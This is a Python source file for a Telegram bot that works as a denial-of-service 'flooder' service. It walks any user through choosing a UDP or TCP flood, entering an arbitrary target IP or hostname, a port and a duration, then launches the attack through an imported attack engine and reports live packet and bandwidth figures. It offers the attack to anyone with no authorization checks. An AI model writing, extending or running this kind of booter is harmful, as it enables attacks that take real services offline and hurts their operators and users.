"""ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ — Bot Handler"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import Dict, Optional

from pyrogram import Client, filters
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from pyrogram.errors import MessageNotModified, MessageDeleteForbidden

from attack_engine import AttackEngine, AttackStats
from config import Config
from utils import human_bytes, is_valid_ip, is_valid_port, resolve_hostname

LOGGER = logging.getLogger(__name__)

# ─── Unicode font helpers ──────────────────────────────────────────────────────

def bold(text: str) -> str:
    return f"**{text}**"

def mono(text: str) -> str:
    return f"`{text}`"

# Small-caps style label (Telegram renders these as-is since they're Unicode chars)
BRAND  = "ᴍɪꜱꜱ ᴄʜᴜᴛᴋɪ"
BRAND2 = "ᴍ.ᴄ ꜰʟᴏᴏᴅᴇʀ"

# ─── Banner photo path ─────────────────────────────────────────────────────────
BANNER_PATH = "banner.jpg"   # place your headphones photo here as banner.jpg

# ─── Session state ─────────────────────────────────────────────────────────────
class UserSession:
    """Tracks per-user state & active attack."""
    __slots__ = (
        "state", "ip", "port", "duration", "method",
        "engine", "attack_task", "last_msg_id", "chat_id",
    )

    def __init__(self) -> None:
        self.state: str = "idle"          # idle | await_ip | await_port | await_dur | attacking
        self.ip: str = ""
        self.port: int = 0
        self.duration: int = 60
        self.method: str = "udp"          # udp | tcp
        self.engine: Optional[AttackEngine] = None
        self.attack_task: Optional[asyncio.Task] = None
        self.last_msg_id: Optional[int] = None
        self.chat_id: Optional[int] = None


SESSIONS: Dict[int, UserSession] = {}

def get_session(user_id: int) -> UserSession:
    if user_id not in SESSIONS:
        SESSIONS[user_id] = UserSession()
    return SESSIONS[user_id]


# ─── Keyboards ─────────────────────────────────────────────────────────────────

def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ", callback_data="attack_start"),
        ],
        [
            InlineKeyboardButton("📊 ꜱᴛᴀᴛᴜꜱ",   callback_data="status"),
            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",      callback_data="stop_attack"),
        ],
        [
            InlineKeyboardButton("ℹ️ ʜᴇʟᴘ",      callback_data="help"),
        ],
    ])

def kb_method() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔵 ᴜᴅᴘ ꜰʟᴏᴏᴅ", callback_data="method_udp"),
            InlineKeyboardButton("🔴 ᴛᴄᴘ ꜰʟᴏᴏᴅ", callback_data="method_tcp"),
        ],
        [
            InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main"),
        ],
    ])

def kb_confirm(ip: str, port: int, dur: int, method: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ ʟᴀᴜɴᴄʜ", callback_data="confirm_launch"),
            InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ",  callback_data="back_main"),
        ],
        [
            InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_method"),
        ],
    ])

def kb_attacking() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 ʀᴇꜰʀᴇꜱʜ", callback_data="status"),
            InlineKeyboardButton("🛑 ꜱᴛᴏᴘ",    callback_data="stop_attack"),
        ],
    ])

def kb_back_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ ʙᴀᴄᴋ", callback_data="back_main")],
    ])


# ─── Message helpers ────────────────────────────────────────────────────────────

async def delete_msg(client: Client, chat_id: int, msg_id: int) -> None:
    try:
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass

async def send_or_edit(
    client: Client,
    session: UserSession,
    text: str,
    keyboard: InlineKeyboardMarkup,
    photo: bool = False,
) -> None:
    """Send a new message (with optional photo), deleting the old one first."""
    if session.last_msg_id and session.chat_id:
        await delete_msg(client, session.chat_id, session.last_msg_id)
        session.last_msg_id = None

    if photo:
        try:
            msg = await client.send_photo(
                session.chat_id,
                photo=BANNER_PATH,
                caption=text,
                reply_markup=keyboard,
            )
        except Exception:
            msg = await client.send_message(
                session.chat_id, text, reply_markup=keyboard
            )
    else:
        msg = await client.send_message(
            session.chat_id, text, reply_markup=keyboard
        )
    session.last_msg_id = msg.id


async def edit_existing(
    client: Client,
    msg: Message,
    session: UserSession,
    text: str,
    keyboard: InlineKeyboardMarkup,
) -> None:
    """Edit the callback message in-place (no photo change)."""
    try:
        await msg.edit_text(text, reply_markup=keyboard)
        session.last_msg_id = msg.id
        session.chat_id = msg.chat.id
    except MessageNotModified:
        pass
    except Exception:
        pass


# ─── Text screens ───────────────────────────────────────────────────────────────

def screen_home() -> str:
    return (
        f"╔══════════════════════╗\n"
        f"║  🎧  {BRAND}  🎧  ║\n"
        f"╚══════════════════════╝\n\n"
        f"**ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ {BRAND2}**\n\n"
        f"⚡ ʜɪɢʜ-ꜱᴘᴇᴇᴅ ᴜᴅᴘ/ᴛᴄᴘ ꜰʟᴏᴏᴅ\n"
        f"🎯 ʏᴏᴜ ꜱᴜᴘᴘʟʏ ᴛʜᴇ ɪᴘ — ᴡᴇ ᴅᴏ ᴛʜᴇ ʀᴇꜱᴛ\n"
        f"🔐 ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ 👇"
    )

def screen_method() -> str:
    return (
        f"🎛️  **ꜱᴇʟᴇᴄᴛ ꜰʟᴏᴏᴅ ᴍᴇᴛʜᴏᴅ**\n\n"
        f"🔵  **ᴜᴅᴘ** — ᴍᴀx ᴛʜʀᴏᴜɢʜᴘᴜᴛ, ᴄᴏɴɴᴇᴄᴛɪᴏɴʟᴇꜱꜱ\n"
        f"🔴  **ᴛᴄᴘ** — ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇxʜᴀᴜꜱᴛɪᴏɴ\n\n"
        f"👇 ᴄʜᴏᴏꜱᴇ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ:"
    )

def screen_await_ip(method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"🎯  **ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɪᴘ**  [{badge}]\n\n"
        f"ꜱᴇɴᴅ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ:\n"
        f"`192.168.1.1`  ᴏʀ  `example.com`\n\n"
        f"⚠️ ᴛʏᴘᴇ ɪᴛ ɪɴ ᴄʜᴀᴛ ɴᴏᴡ 👇"
    )

def screen_await_port() -> str:
    return (
        f"🔌  **ᴇɴᴛᴇʀ ᴘᴏʀᴛ**\n\n"
        f"ꜱᴇɴᴅ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴘᴏʀᴛ ɴᴜᴍʙᴇʀ:\n"
        f"`80`  ·  `443`  ·  `8080`  ·  `1-65535`\n\n"
        f"⚠️ ᴛʏᴘᴇ ɪᴛ ɪɴ ᴄʜᴀᴛ ɴᴏᴡ 👇"
    )

def screen_await_dur(max_dur: int) -> str:
    return (
        f"⏱️  **ᴇɴᴛᴇʀ ᴅᴜʀᴀᴛɪᴏɴ** (ꜱᴇᴄᴏɴᴅꜱ)\n\n"
        f"ᴍᴀx ᴀʟʟᴏᴡᴇᴅ: `{max_dur}s`\n"
        f"ᴇxᴀᴍᴘʟᴇ: `60` · `120` · `300`\n\n"
        f"⚠️ ᴛʏᴘᴇ ɪᴛ ɪɴ ᴄʜᴀᴛ ɴᴏᴡ 👇"
    )

def screen_confirm(ip: str, port: int, dur: int, method: str, threads: int) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"🚀  **ᴄᴏɴꜰɪʀᴍ ᴀᴛᴛᴀᴄᴋ**\n\n"
        f"┌─────────────────────┐\n"
        f"│  🎯 ᴛᴀʀɢᴇᴛ  :  `{ip}`\n"
        f"│  🔌 ᴘᴏʀᴛ    :  `{port}`\n"
        f"│  ⏱️ ᴅᴜʀ     :  `{dur}s`\n"
        f"│  ⚡ ᴍᴇᴛʜᴏᴅ :  {badge}\n"
        f"│  🧵 ᴛʜʀᴇᴀᴅꜱ :  `{threads}`\n"
        f"└─────────────────────┘\n\n"
        f"ᴘʀᴇꜱꜱ **✅ ʟᴀᴜɴᴄʜ** ᴛᴏ ꜰɪʀᴇ 🔥"
    )

def screen_attacking(ip: str, port: int, dur: int, method: str, elapsed: float) -> str:
    remaining = max(0, dur - int(elapsed))
    bar_filled = int((elapsed / dur) * 20) if dur > 0 else 0
    bar_filled = min(20, bar_filled)
    bar = "█" * bar_filled + "░" * (20 - bar_filled)
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"💥  **ᴀᴛᴛᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ**\n\n"
        f"🎯  `{ip}:{port}`  {badge}\n\n"
        f"[{bar}]\n"
        f"⏱️ ᴇʟᴀᴘꜱᴇᴅ: `{int(elapsed)}s`  |  ʀᴇᴍᴀɪɴɪɴɢ: `{remaining}s`\n\n"
        f"ᴜꜱᴇ 📊 ʀᴇꜰʀᴇꜱʜ ꜰᴏʀ ʟɪᴠᴇ ꜱᴛᴀᴛꜱ ·  🛑 ꜱᴛᴏᴘ ᴛᴏ ᴀʙᴏʀᴛ"
    )

def screen_stats(stats: AttackStats, ip: str, port: int, method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    status = "🟢 ʀᴜɴɴɪɴɢ" if stats.running else "🔴 ꜱᴛᴏᴘᴘᴇᴅ"
    return (
        f"📊  **ʟɪᴠᴇ ꜱᴛᴀᴛꜱ**  {status}\n\n"
        f"┌─────────────────────────┐\n"
        f"│  🎯  `{ip}:{port}`  {badge}\n"
        f"│  📦 ᴘᴋᴛꜱ ꜱᴇɴᴛ   :  `{stats.sent_packets:,}`\n"
        f"│  ❌ ꜰᴀɪʟᴇᴅ       :  `{stats.failed_packets:,}`\n"
        f"│  📶 ᴅᴀᴛᴀ ꜱᴇɴᴛ   :  `{human_bytes(stats.bytes_sent)}`\n"
        f"│  ⚡ ᴘᴘꜱ          :  `{stats.pps:,.0f}`\n"
        f"│  🌊 ᴍʙᴘꜱ        :  `{stats.mbps:.2f}`\n"
        f"│  ⏱️ ᴇʟᴀᴘꜱᴇᴅ     :  `{stats.elapsed:.1f}s`\n"
        f"└─────────────────────────┘"
    )

def screen_done(stats: AttackStats, ip: str, port: int, method: str) -> str:
    badge = "🔵 ᴜᴅᴘ" if method == "udp" else "🔴 ᴛᴄᴘ"
    return (
        f"✅  **ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ**\n\n"
        f"🎯  `{ip}:{port}`  {badge}\n\n"
        f"┌─────────────────────────┐\n"
        f"│  📦 ᴛᴏᴛᴀʟ ᴘᴋᴛꜱ  :  `{stats.sent_packets:,}`\n"
        f"│  📶 ᴛᴏᴛᴀʟ ᴅᴀᴛᴀ  :  `{human_bytes(stats.bytes_sent)}`\n"
        f"│  ⚡ ᴀᴠɢ ᴘᴘꜱ     :  `{stats.pps:,.0f}`\n"
        f"│  🌊 ᴀᴠɢ ᴍʙᴘꜱ   :  `{stats.mbps:.2f}`\n"
        f"│  ⏱️ ᴅᴜʀᴀᴛɪᴏɴ   :  `{stats.elapsed:.1f}s`\n"
        f"└─────────────────────────┘\n\n"
        f"🏠 ʀᴇᴀᴅʏ ꜰᴏʀ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ?"
    )

def screen_help() -> str:
    return (
        f"ℹ️  **{BRAND} — ʜᴇʟᴘ**\n\n"
        f"**ʜᴏᴡ ᴛᴏ ᴜꜱᴇ:**\n"
        f"1️⃣  ᴘʀᴇꜱꜱ **⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ**\n"
        f"2️⃣  ᴄʜᴏᴏꜱᴇ **ᴜᴅᴘ** ᴏʀ **ᴛᴄᴘ** ᴍᴇᴛʜᴏᴅ\n"
        f"3️⃣  ᴛʏᴘᴇ ᴛᴀʀɢᴇᴛ **ɪᴘ**\n"
        f"4️⃣  ᴛʏᴘᴇ ᴛᴀʀɢᴇᴛ **ᴘᴏʀᴛ**\n"
        f"5️⃣  ᴛʏᴘᴇ **ᴅᴜʀᴀᴛɪᴏɴ** (ꜱᴇᴄᴏɴᴅꜱ)\n"
        f"6️⃣  ᴄᴏɴꜰɪʀᴍ ᴀɴᴅ **ʟᴀᴜɴᴄʜ** 🔥\n\n"
        f"**ᴄᴏᴍᴍᴀɴᴅꜱ:**\n"
        f"• /start — ᴍᴀɪɴ ᴍᴇɴᴜ\n"
        f"• /stop  — ᴀʙᴏʀᴛ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ\n"
        f"• /stats — ʟɪᴠᴇ ꜱᴛᴀᴛꜱ"
    )

def screen_error(msg: str) -> str:
    return f"❌  **ᴇʀʀᴏʀ**\n\n`{msg}`"

def screen_idle_stats() -> str:
    return (
        f"📊  **ꜱᴛᴀᴛᴜꜱ**\n\n"
        f"🟡 ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ\n"
        f"ᴘʀᴇꜱꜱ **⚡ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ** ᴛᴏ ʙᴇɢɪɴ"
    )


# ─── Handler registration ───────────────────────────────────────────────────────

def register(bot: Client, cfg: Config) -> None:

    # /start
    @bot.on_message(filters.command("start") & filters.private)
    async def cmd_start(client: Client, message: Message) -> None:
        uid = message.from_user.id
        sess = get_session(uid)
        sess.state = "idle"
        sess.chat_id = message.chat.id
        await delete_msg(client, message.chat.id, message.id)
        await send_or_edit(client, sess, screen_home(), kb_main(), photo=True)

    # /stop
    @bot.on_message(filters.command("stop") & filters.private)
    async def cmd_stop(client: Client, message: Message) -> None:
        uid = message.from_user.id
        sess = get_session(uid)
        sess.chat_id = message.chat.id
        await delete_msg(client, message.chat.id, message.id)
        await _do_stop(client, sess)

    # /stats
    @bot.on_message(filters.command("stats") & filters.private)
    async def cmd_stats(client: Client, message: Message) -> None:
        uid = message.from_user.id
        sess = get_session(uid)
        sess.chat_id = message.chat.id
        await delete_msg(client, message.chat.id, message.id)
        if sess.engine and sess.engine.stats.running:
            text = screen_stats(sess.engine.stats, sess.ip, sess.port, sess.method)
            await send_or_edit(client, sess, text, kb_attacking())
        else:
            await send_or_edit(client, sess, screen_idle_stats(), kb_main())

    # ─── Inline text input listener ──────────────────────────────────────────
    @bot.on_message(filters.text & filters.private & ~filters.command(["start", "stop", "stats"]))
    async def on_text(client: Client, message: Message) -> None:
        uid = message.from_user.id
        sess = get_session(uid)
        sess.chat_id = message.chat.id
        text = message.text.strip()
        await delete_msg(client, message.chat.id, message.id)  # delete user input msg

        if sess.state == "await_ip":
            # Resolve hostname if needed
            resolved = text
            if not is_valid_ip(text):
                resolved = resolve_hostname(text)
                if not resolved:
                    await send_or_edit(client, sess, screen_error(f"ᴄᴀɴɴᴏᴛ ʀᴇꜱᴏʟᴠᴇ: {text}"), kb_back_main())
                    return
            sess.ip = resolved
            sess.state = "await_port"
            await send_or_edit(client, sess, screen_await_port(), kb_back_main())

        elif sess.state == "await_port":
            if not text.isdigit() or not is_valid_port(int(text)):
                await send_or_edit(client, sess, screen_error("ᴘᴏʀᴛ ᴍᴜꜱᴛ ʙᴇ 1–65535"), kb_back_main())
                return
            sess.port = int(text)
            sess.state = "await_dur"
            await send_or_edit(client, sess, screen_await_dur(cfg.max_duration), kb_back_main())

        elif sess.state == "await_dur":
            if not text.isdigit():
                await send_or_edit(client, sess, screen_error("ᴅᴜʀᴀᴛɪᴏɴ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ"), kb_back_main())
                return
            dur = min(int(text), cfg.max_duration)
            sess.duration = dur
            sess.state = "confirm"
            text_out = screen_confirm(sess.ip, sess.port, dur, sess.method, cfg.max_threads)
            await send_or_edit(client, sess, text_out, kb_confirm(sess.ip, sess.port, dur, sess.method))

        else:
            # Unknown text — redirect to home
            await send_or_edit(client, sess, screen_home(), kb_main(), photo=True)


    # ─── Callback queries ─────────────────────────────────────────────────────
    @bot.on_callback_query()
    async def on_cb(client: Client, cb: CallbackQuery) -> None:
        uid = cb.from_user.id
        sess = get_session(uid)
        sess.chat_id = cb.message.chat.id
        data = cb.data

        await cb.answer()  # dismiss loading spinner

        # ── back to main ──
        if data == "back_main":
            sess.state = "idle"
            await edit_existing(client, cb.message, sess, screen_home(), kb_main())

        # ── attack start ──
        elif data == "attack_start":
            await edit_existing(client, cb.message, sess, screen_method(), kb_method())

        # ── method select ──
        elif data == "method_udp":
            sess.method = "udp"
            sess.state = "await_ip"
            await edit_existing(client, cb.message, sess, screen_await_ip("udp"), kb_back_main())

        elif data == "method_tcp":
            sess.method = "tcp"
            sess.state = "await_ip"
            await edit_existing(client, cb.message, sess, screen_await_ip("tcp"), kb_back_main())

        # ── back to method ──
        elif data == "back_method":
            sess.state = "idle"
            await edit_existing(client, cb.message, sess, screen_method(), kb_method())

        # ── confirm launch ──
        elif data == "confirm_launch":
            if sess.state not in ("confirm",):
                await edit_existing(client, cb.message, sess, screen_home(), kb_main())
                return
            sess.state = "attacking"
            text = screen_attacking(sess.ip, sess.port, sess.duration, sess.method, 0)
            await edit_existing(client, cb.message, sess, text, kb_attacking())

            engine = AttackEngine(cfg.max_threads, cfg.max_duration)
            sess.engine = engine

            async def _run_attack() -> None:
                try:
                    if sess.method == "udp":
                        stats = await engine.run_udp(sess.ip, sess.port, sess.duration)
                    else:
                        stats = await engine.run_tcp(sess.ip, sess.port, sess.duration)

                    # Attack finished — show done screen
                    sess.state = "idle"
                    done_text = screen_done(stats, sess.ip, sess.port, sess.method)
                    try:
                        await cb.message.edit_text(done_text, reply_markup=kb_main())
                        sess.last_msg_id = cb.message.id
                    except Exception:
                        pass
                except asyncio.CancelledError:
                    pass
                except Exception as e:
                    LOGGER.exception("Attack task error")
                    try:
                        await cb.message.edit_text(
                            screen_error(str(e)), reply_markup=kb_main()
                        )
                    except Exception:
                        pass

            sess.attack_task = asyncio.create_task(_run_attack())

        # ── status refresh ──
        elif data == "status":
            if sess.engine and sess.engine.stats.running:
                text = screen_stats(sess.engine.stats, sess.ip, sess.port, sess.method)
                await edit_existing(client, cb.message, sess, text, kb_attacking())
            else:
                await edit_existing(client, cb.message, sess, screen_idle_stats(), kb_main())

        # ── stop attack ──
        elif data == "stop_attack":
            await _do_stop(client, sess, cb.message)

        # ── help ──
        elif data == "help":
            await edit_existing(client, cb.message, sess, screen_help(), kb_back_main())


    # ─── Stop helper ──────────────────────────────────────────────────────────
    async def _do_stop(
        client: Client,
        sess: UserSession,
        msg: Optional[Message] = None,
    ) -> None:
        stopped = False
        if sess.engine:
            sess.engine.stop()
            stopped = True
        if sess.attack_task and not sess.attack_task.done():
            sess.attack_task.cancel()
            try:
                await sess.attack_task
            except asyncio.CancelledError:
                pass

        sess.state = "idle"
        text = (
            f"🛑  **ᴀᴛᴛᴀᴄᴋ ᴀʙᴏʀᴛᴇᴅ**\n\n"
            f"{'ꜱᴛᴏᴘᴘᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ✅' if stopped else 'ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ 🟡'}"
        )
        if msg:
            try:
                await msg.edit_text(text, reply_markup=kb_main())
                sess.last_msg_id = msg.id
                return
            except Exception:
                pass
        await send_or_edit(client, sess, text, kb_main())
